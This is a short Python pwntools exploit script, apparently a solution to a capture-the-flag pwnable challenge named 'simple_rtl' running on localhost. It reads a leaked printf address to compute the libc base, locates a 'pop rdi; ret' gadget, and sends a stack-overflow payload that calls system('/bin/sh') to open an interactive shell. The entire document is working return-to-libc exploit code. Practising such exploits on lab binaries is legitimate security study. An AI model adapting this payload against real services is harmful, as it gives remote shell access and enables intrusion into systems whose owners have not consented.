from pwn import *

IP = '127.0.0.1'
PORT = 12371

p = remote(IP, PORT)
libc = ELF('./simple_rtl/publish/libc-2.31.so')
#libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
#p = process('./Pwnable/aslr_nx/simple_rtl/prob/prob')
e = ELF('./simple_rtl/publish/prob')
r = ROP(e)

# 1. Get libc Base
p.recvuntil(b'printf addr: ')

printf_address = p.recvuntil('\n')
libc_base = int(printf_address, 16) - libc.sym['printf']

print("libc_base : ", hex(libc_base))
print("printf addr : ", hex(int(printf_address, 16)))

system_plt = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b"/bin/sh\x00"))

print("system : ", hex(system_plt))

# 2. Find Gadget (pop rdi;ret;)
pop_rdi = (ROP(libc).find_gadget(['pop rdi', 'ret']))[0]
pop_rdi += libc_base

# 3. Find Gadget (ret;) for stack alignment

ret = pop_rdi + 1

# 4. build payload
# overflow dummy + pop_rdi_ret + "/bin/sh" + system

payload = b"\x90" * 0x40
payload += b"A" * 8
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system_plt)
#payload += b"A" * 8


pause()

p.send(payload)

p.interactive()